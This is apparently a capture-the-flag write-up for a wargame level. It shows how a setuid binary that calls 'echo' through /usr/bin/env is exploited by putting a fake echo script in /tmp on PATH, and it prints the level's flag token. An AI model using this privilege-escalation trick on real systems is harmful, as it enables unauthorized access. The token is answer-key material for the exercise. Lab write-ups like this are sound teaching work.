<h1 id="level03">Level03</h1>
<ul>
	<li>We spawn with a <code>level03</code> file in root repository</li>
	<li>No extension so I try to execute it and it prints &#39;Exploit me&#39;</li>
	<li>Then I try to <em>cat</em> the file but its unreadable</li>
	<li>Using &#39;file&#39;
		<blockquote>
		<p><code>level03: setuid setgid ELF 32-bit LSB executable</code></p>
		</blockquote>
	</li>
	<li>I still wanted to get a good look at the file so I used:
	<blockquote>
		<p>
		<code>objdump -M Intel -d level03</code>
		<p><em>The -M Intel to get a more readable asm for me</em></p>
		</p>
	</blockquote>
	</li>
	<li>Code was still kinda bad so I did a little script to make it cleaner
		<blockquote>
		<p><code>sh cutlines.sh</code></p>
		</blockquote>
	</li>
	<li>We can see many calls but one of them is a system one</li>
	<li>So when we look into it on <code>gdb</code><blockquote>
	<p><code>0x80485e0:       &quot;/usr/bin/env echo Exploit me&quot;</code></p>
	</blockquote>
	</li>
	<li>It seems like <code>echo</code> is vulnerable to manipulation since it&#39;s called using <code>/usr/bin/env</code> which makes the computer use the first binary found in <code>PATH</code></li>
	<li>So we should be able to create a script called echo to get the flag for us !
	<blockquote>
		<p>
		<code>echo &#39;getflag&#39; &gt; /tmp/echo</code>
		<code>export PATH=/tmp:$PATH</code>
		<code>./level03</code>
		</p>
	</blockquote>
	</li>
	<li>DOESN&#39;T WORK ! WHY ? (Well I forgot a little something)
		<blockquote>
			<p>
			<code>chmod +x /tmp/echo</code>
			<code>./level03</code>
			<code>Check flag.Here is your token : qi0maab88jeaj46qoumi7maus</code>
			</p>
		</blockquote>
	</li>
</ul>
